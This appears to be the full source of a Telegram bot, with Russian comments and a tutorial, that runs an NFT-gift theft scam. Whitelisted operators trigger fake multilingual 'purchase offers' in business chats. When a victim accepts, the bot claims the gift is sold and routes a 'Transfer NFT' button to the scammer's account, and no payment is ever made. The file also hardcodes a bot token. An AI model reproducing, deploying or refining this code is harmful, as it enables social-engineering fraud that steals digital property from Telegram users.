import asyncio
import json
import os
import re
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, LinkPreviewOptions
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.exceptions import TelegramRetryAfter

# ─── НАСТРОЙКИ ───
BOT_TOKEN = "8588452412:AAFri3a-gzv-iJlVKXyRqWKJMrcavclmvjU"
OWNER_ID = 8145037447

WHITELIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitelist.json")
DEFAULT_WHITELIST = {8145037447, 8875237733}

WORKER_URL = "https://telegram-proxy.sagatdiev13022009.workers.dev"

session = AiohttpSession(api=TelegramAPIServer.from_base(WORKER_URL))
bot = Bot(token=BOT_TOKEN, session=session)
dp = Dispatcher()

# ─── ID КАСТОМНЫХ ЭМОДЗИ ───
CUSTOM_CHECK_ID = "5825794181183836432"
CUSTOM_CROSS_ID = "5872829476143894491"
CUSTOM_TRANSFER_ID = "5877468380125990242"
CUSTOM_GIFT_ID = "5361649430715972984"

# ═══════════════════════════════════════════════════════════
#   ТЕКСТЫ ПО ЯЗЫКАМ
# ═══════════════════════════════════════════════════════════

OFFER_TEXTS = {
    "ru": (
        "Пользователь <b>{user_name}</b> предлагает\n"
        "Вам <b>{price_label}</b> за подарок\n"
        "<b>{gift_link}</b>.\n\n"
        "Предложение действует еще <b>{duration}</b>."
    ),
    "en": (
        "User <b>{user_name}</b> offers\n"
        "You <b>{price_label}</b> for the gift\n"
        "<b>{gift_link}</b>.\n\n"
        "The offer is valid for <b>{duration}</b> more."
    ),
    "zh": (
        "用户 <b>{user_name}</b> 向您提供\n"
        "<b>{price_label}</b> 购买礼物\n"
        "<b>{gift_link}</b>。\n\n"
        "报价有效期还剩 <b>{duration}</b>。"
    ),
    "ar": (
        "المستخدم <b>{user_name}</b> يعرض عليك\n"
        "<b>{price_label}</b> مقابل الهدية\n"
        "<b>{gift_link}</b>.\n\n"
        "العرض صالح لمدة <b>{duration}</b> أخرى."
    ),
}

PRICE_LABELS = {
    "ru": {"stars": "звёзд", "gram": "GRAM"},
    "en": {"stars": "Stars", "gram": "GRAM"},
    "zh": {"stars": "星星", "gram": "GRAM"},
    "ar": {"stars": "نجوم", "gram": "GRAM"},
}

DURATION_TEXTS = {
    "ru": "5ч 59м",
    "en": "5h 59m",
    "zh": "5小时59分钟",
    "ar": "5 ساعات و59 دقيقة",
}

BUTTON_TEXTS = {
    "ru": {"decline": "Отклонить", "accept": "Принять"},
    "en": {"decline": "Decline", "accept": "Accept"},
    "zh": {"decline": "拒绝", "accept": "接受"},
    "ar": {"decline": "رفض", "accept": "قبول"},
}

ACCEPT_ALERT_TEXTS = {
    "ru": (
        "Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение."
    ),
    "en": (
        "Attention!\n\n"
        "Follow the instructions to avoid losing the gift and receive payment.\n\n"
        "Tap «OK» if you have read this message."
    ),
    "zh": (
        "注意！\n\n"
        "请按照说明操作，以免丢失礼物并收到付款。\n\n"
        "如果您已阅读此消息，请点击「OK」。"
    ),
    "ar": (
        "تنبيه!\n\n"
        "اتبع التعليمات حتى لا تفقد الهدية وتحصل على الدفع.\n\n"
        "اضغط على «OK» إذا قرأت هذه الرسالة."
    ),
}

SOLD_TEXTS = {
    "ru": (
        "{gift_emoji} Подарок: <b>{gift_link}</b> успешно продан!\n\n"
        "Передайте подарок покупателю для зачисления <b>{currency_label}</b>."
    ),
    "en": (
        "{gift_emoji} Gift: <b>{gift_link}</b> successfully sold!\n\n"
        "Transfer the gift to the buyer to receive <b>{currency_label}</b>."
    ),
    "zh": (
        "{gift_emoji} 礼物：<b>{gift_link}</b> 成功售出！\n\n"
        "请将礼物转给买家以获取 <b>{currency_label}</b>。"
    ),
    "ar": (
        "{gift_emoji} الهدية: <b>{gift_link}</b> تم بيعها بنجاح!\n\n"
        "قم بتحويل الهدية إلى المشتري لاستلام <b>{currency_label}</b>."
    ),
}

TRANSFER_BUTTON_TEXTS = {
    "ru": "Передать NFT",
    "en": "Transfer NFT",
    "zh": "转赠 NFT",
    "ar": "تحويل NFT",
}

DECLINE_TEXTS = {
    "ru": "❌ Отклонено!",
    "en": "❌ Declined!",
    "zh": "❌ 已拒绝！",
    "ar": "❌ تم الرفض!",
}

DECLINED_MESSAGE_TEXTS = {
    "ru": "❌ <b>Предложение отклонено</b>",
    "en": "❌ <b>Offer declined</b>",
    "zh": "❌ <b>报价已被拒绝</b>",
    "ar": "❌ <b>تم رفض العرض</b>",
}

# ─── РЕГУЛЯРКИ ───
BUY_PATTERN = re.compile(
    r"^\.buy\s+"
    r"(?P<link>https?://\S+)\s+"
    r"(?P<price>\d+(?:\.\d+)?)\s+"
    r"(?P<currency>gram|stars)\s+"
    r"(?P<lang>ru|en|zh|ar)\s*$",
    re.IGNORECASE
)
ADD_USER_PATTERN = re.compile(r"^\.adduser\s+(\d+)\s*$", re.IGNORECASE)
REMOVE_USER_PATTERN = re.compile(r"^\.removeuser\s+(\d+)\s*$", re.IGNORECASE)

offer_data = {}

TUTORIAL_TEXT = (
    "📖 <b>ТУТОРИАЛ</b>\n\n"
    "⚠️ <b>ЧТОБЫ ПОЛЬЗОВАТЬСЯ БОТОМ ОБЯЗАТЕЛЬНО НУЖЕН ТГ ПРЕМИУМ</b>\n"
    "ДЛЯ ДОСТУПА К БОТУ ПИШЕМ — @tgofferdeals\n\n"
    "⚙️ <b>НАСТРОЙКА БОТА:</b>\n"
    "ЗАХОДИМ <b>НАСТРОЙКИ → ТЕЛЕГРАМ ДЛЯ БИЗНЕСА → ЧАТ-БОТЫ</b> → "
    "ТУДА ВПИСЫВАЕМ <code>@offer322bot</code>, пролистываем вниз "
    "и ставим все разрешения на сообщения <b>(5/5)</b>\n\n"
    "📝 <b>Команда для ворка:</b>\n"
    "<code>.buy (ссылка на нфт) (цена stars/gram) (язык)</code>\n\n"
    "🌍 <b>Языки:</b>\n"
    "• <code>ru</code> — русский\n"
    "• <code>en</code> — английский\n"
    "• <code>zh</code> — китайский\n"
    "• <code>ar</code> — арабский"
)


# ═══════════════════════════════════════════════════════════
#   БЕЛЫЙ СПИСОК
# ═══════════════════════════════════════════════════════════
def load_whitelist() -> set:
    if not os.path.exists(WHITELIST_FILE):
        save_whitelist(DEFAULT_WHITELIST)
        return set(DEFAULT_WHITELIST)
    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return set(int(x) for x in data)
    except Exception as e:
        print(f"⚠️ Ошибка чтения {WHITELIST_FILE}: {e}")
        return set(DEFAULT_WHITELIST)


def save_whitelist(ids: set):
    try:
        with open(WHITELIST_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(ids)), f, ensure_ascii=False, indent=2)
        print(f"💾 Сохранено: {ids}")
    except Exception as e:
        print(f"❌ save: {e}")


WHITELIST = load_whitelist()


def parse_gift_name(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        name, num = slug.rsplit("-", 1)
        pretty = re.sub(r"(?<!^)(?=[A-Z])", " ", name)
        return f"{pretty} #{num}"
    return slug


async def get_user_info(user_id: int) -> str:
    try:
        chat = await bot.get_chat(user_id)
        username = f"@{chat.username}" if chat.username else "—"
        first_name = chat.first_name or ""
        last_name = chat.last_name or ""
        full_name = f"{first_name} {last_name}".strip() or "—"
        return f"{username} ({full_name}) — <code>{user_id}</code>"
    except Exception as e:
        print(f"⚠️ get_chat({user_id}): {type(e).__name__}: {e}")
        return f"— — <code>{user_id}</code>"


async def send_with_retry(chat_id, text, business_connection_id, reply_markup=None):
    while True:
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=text,
                business_connection_id=business_connection_id,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(show_above_text=True),
                reply_markup=reply_markup
            )
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after + 2)
        except Exception as e:
            print(f"❌ send: {type(e).__name__}: {e}")
            return None


# ═══════════════════════════════════════════════════════════
#   КОМАНДЫ В ЛИЧКЕ
# ═══════════════════════════════════════════════════════════

@dp.message(F.text.startswith("/start"))
async def cmd_start(message: Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="📖 Туториал", callback_data="show_tutorial")
    builder.adjust(1)

    await message.answer(
        "👋 <b>Привет!</b>\n\n"
        "Этот бот используется для отправки предложений о покупке NFT-подарков.\n\n"
        f"<b>Твой ID:</b> <code>{message.from_user.id}</code>\n\n"
        "Нажми кнопку ниже, чтобы посмотреть инструкцию:",
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )


@dp.message(F.text.startswith("/tutorial"))
async def cmd_tutorial(message: Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="📖 Туториал", callback_data="show_tutorial")
    builder.adjust(1)

    await message.answer(
        "Нажми кнопку ниже, чтобы посмотреть инструкцию:",
        parse_mode="HTML",
        reply_markup=builder.as_markup()
    )


@dp.callback_query(F.data == "show_tutorial")
async def handle_tutorial(callback: CallbackQuery):
    await callback.answer()
    builder = InlineKeyboardBuilder()
    builder.button(text="✖ Закрыть", callback_data="close_tutorial")
    builder.adjust(1)
    try:
        await callback.message.edit_text(
            TUTORIAL_TEXT, parse_mode="HTML", reply_markup=builder.as_markup()
        )
    except Exception:
        await callback.message.answer(
            TUTORIAL_TEXT, parse_mode="HTML", reply_markup=builder.as_markup()
        )


@dp.callback_query(F.data == "close_tutorial")
async def handle_close_tutorial(callback: CallbackQuery):
    await callback.answer()
    try:
        await callback.message.delete()
    except Exception:
        pass


@dp.message(F.text.startswith("/myid"))
async def cmd_myid(message: Message):
    await message.answer(f"Твой ID: <code>{message.from_user.id}</code>", parse_mode="HTML")


@dp.message(F.text.startswith(".adduser"))
async def handle_adduser(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID:
        await message.answer("⛔ Нет доступа.")
        return

    match = ADD_USER_PATTERN.match((message.text or "").strip())
    if not match:
        await message.answer("⚠️ Использование: <code>.adduser 123456789</code>", parse_mode="HTML")
        return

    new_id = int(match.group(1))

    if new_id in WHITELIST:
        await message.answer(f"ℹ️ Пользователь <code>{new_id}</code> уже в списке.", parse_mode="HTML")
        return

    WHITELIST.add(new_id)
    save_whitelist(WHITELIST)

    info = await get_user_info(new_id)
    await message.answer(
        f"✅ Добавлен:\n{info}\n\n<b>Всего в списке:</b> {len(WHITELIST)}",
        parse_mode="HTML"
    )


@dp.message(F.text.startswith(".removeuser"))
async def handle_removeuser(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID:
        await message.answer("⛔ Нет доступа.")
        return

    match = REMOVE_USER_PATTERN.match((message.text or "").strip())
    if not match:
        await message.answer("⚠️ Использование: <code>.removeuser 123456789</code>", parse_mode="HTML")
        return

    target_id = int(match.group(1))

    if target_id == OWNER_ID:
        await message.answer("⛔ Нельзя удалить владельца.")
        return

    if target_id not in WHITELIST:
        await message.answer(f"ℹ️ Пользователя <code>{target_id}</code> нет в списке.", parse_mode="HTML")
        return

    WHITELIST.remove(target_id)
    save_whitelist(WHITELIST)

    await message.answer(
        f"✅ Удалён <code>{target_id}</code>.\n<b>Всего в списке:</b> {len(WHITELIST)}",
        parse_mode="HTML"
    )


@dp.message(F.text.startswith(".listusers"))
async def handle_listusers(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID:
        await message.answer("⛔ Нет доступа.")
        return

    if not WHITELIST:
        await message.answer("📋 Белый список пуст.")
        return

    await message.answer(f"⏳ Загружаю данные ({len(WHITELIST)} чел.)...")

    lines = []
    for uid in sorted(WHITELIST):
        info = await get_user_info(uid)
        lines.append(f"• {info}")

    text = f"📋 <b>Белый список ({len(WHITELIST)}):</b>\n\n" + "\n".join(lines)
    await message.answer(text, parse_mode="HTML")


@dp.message(F.text.startswith("."))
async def unknown_command(message: Message):
    await message.answer(
        "❓ Неизвестная команда.\n\n"
        "<b>Доступные:</b>\n"
        "• <code>/tutorial</code> — инструкция\n"
        "• <code>.adduser ID</code> — добавить\n"
        "• <code>.removeuser ID</code> — удалить\n"
        "• <code>.listusers</code> — список",
        parse_mode="HTML"
    )


# ═══════════════════════════════════════════════════════════
#   КОМАНДА .buy В БИЗНЕС-ЧАТАХ
# ═══════════════════════════════════════════════════════════
@dp.business_message(F.text.startswith(".buy"))
async def handle_buy(message: Message):
    if message.from_user is None or message.from_user.id not in WHITELIST:
        return

    text = (message.text or "").strip()
    match = BUY_PATTERN.match(text)
    if not match:
        return

    link = match.group("link")
    price = match.group("price")
    currency = match.group("currency").lower()
    lang = match.group("lang").lower()

    user_name = message.from_user.first_name or "User"
    gift_name = parse_gift_name(link)

    currency_label = PRICE_LABELS.get(lang, PRICE_LABELS["ru"])[currency]
    price_label = f"{price} {currency_label}"

    gift_link = f'<a href="{link}">{gift_name}</a>'

    duration = DURATION_TEXTS.get(lang, DURATION_TEXTS["ru"])
    new_text = OFFER_TEXTS.get(lang, OFFER_TEXTS["ru"]).format(
        user_name=user_name,
        price_label=price_label,
        gift_link=gift_link,
        duration=duration,
    )

    btns = BUTTON_TEXTS.get(lang, BUTTON_TEXTS["ru"])

    builder = InlineKeyboardBuilder()
    builder.button(
        text=btns["decline"],
        callback_data="decline_offer",
        icon_custom_emoji_id=CUSTOM_CROSS_ID
    )
    builder.button(
        text=btns["accept"],
        callback_data="accept_offer",
        icon_custom_emoji_id=CUSTOM_CHECK_ID
    )
    builder.adjust(2)

    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        print(f"⚠️ delete: {type(e).__name__}: {e}")

    result = await send_with_retry(
        chat_id=message.chat.id,
        text=new_text,
        business_connection_id=message.business_connection_id,
        reply_markup=builder.as_markup()
    )

    if result:
        offer_data[result.message_id] = {
            "link": link,
            "gift_name": gift_name,
            "currency": currency,
            "lang": lang,
        }
        print(f"✅ Отправлено ({lang}). message_id={result.message_id}")


# ─── КНОПКА «ПРИНЯТЬ» ───
@dp.callback_query(F.data == "accept_offer")
async def handle_accept(callback: CallbackQuery):
    msg_id = callback.message.message_id
    data = offer_data.get(msg_id)
    lang = data.get("lang", "ru") if data else "ru"

    await callback.answer(
        ACCEPT_ALERT_TEXTS.get(lang, ACCEPT_ALERT_TEXTS["ru"]),
        show_alert=True
    )

    if not data:
        html_text = callback.message.html_text or ""
        link_match = re.search(r'<a href="([^"]+)">([^<]+)</a>', html_text)
        if link_match:
            data = {
                "link": link_match.group(1),
                "gift_name": link_match.group(2),
                "currency": "gram" if "GRAM" in html_text else "stars",
                "lang": "ru",
            }

    if not data:
        return

    link = data["link"]
    gift_name = data["gift_name"]
    currency = data["currency"]
    lang = data.get("lang", "ru")

    currency_label = PRICE_LABELS.get(lang, PRICE_LABELS["ru"])[currency]
    gift_link = f'<a href="{link}">{gift_name}</a>'
    gift_emoji = f'<tg-emoji emoji-id="{CUSTOM_GIFT_ID}">🎁</tg-emoji>'

    new_text = SOLD_TEXTS.get(lang, SOLD_TEXTS["ru"]).format(
        gift_emoji=gift_emoji,
        gift_link=gift_link,
        currency_label=currency_label,
    )

    transfer_text = TRANSFER_BUTTON_TEXTS.get(lang, TRANSFER_BUTTON_TEXTS["ru"])

    builder = InlineKeyboardBuilder()
    builder.button(
        text=transfer_text,
        url="tg://send_gift?to=tgofferdeals",
        icon_custom_emoji_id=CUSTOM_TRANSFER_ID
    )
    builder.adjust(1)

    try:
        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=msg_id,
            business_connection_id=callback.message.business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(show_above_text=True),
            reply_markup=builder.as_markup()
        )
        print(f"✅ Отредактировано ({lang})")
        offer_data.pop(msg_id, None)
    except Exception as e:
        print(f"❌ edit: {type(e).__name__}: {e}")


# ─── КНОПКА «ОТКЛОНИТЬ» ───
@dp.callback_query(F.data == "decline_offer")
async def handle_decline(callback: CallbackQuery):
    msg_id = callback.message.message_id
    data = offer_data.get(msg_id)
    lang = data.get("lang", "ru") if data else "ru"

    await callback.answer(DECLINE_TEXTS.get(lang, DECLINE_TEXTS["ru"]))

    new_text = DECLINED_MESSAGE_TEXTS.get(lang, DECLINED_MESSAGE_TEXTS["ru"])

    try:
        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=msg_id,
            business_connection_id=callback.message.business_connection_id,
            parse_mode="HTML",
            reply_markup=None
        )
        print(f"✅ Отклонено ({lang})")
        offer_data.pop(msg_id, None)
    except Exception as e:
        print(f"❌ edit decline: {type(e).__name__}: {e}")


# ─── ЗАПУСК ───
async def main():
    me = await bot.get_me()
    print(f"✅ Бот: @{me.username}")
    print(f"👑 OWNER_ID: {OWNER_ID}")
    print(f"🔐 WHITELIST: {WHITELIST}")
    print(f"📁 Файл: {os.path.abspath(WHITELIST_FILE)}")
    print("Языки: ru / en / zh / ar")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Остановлен")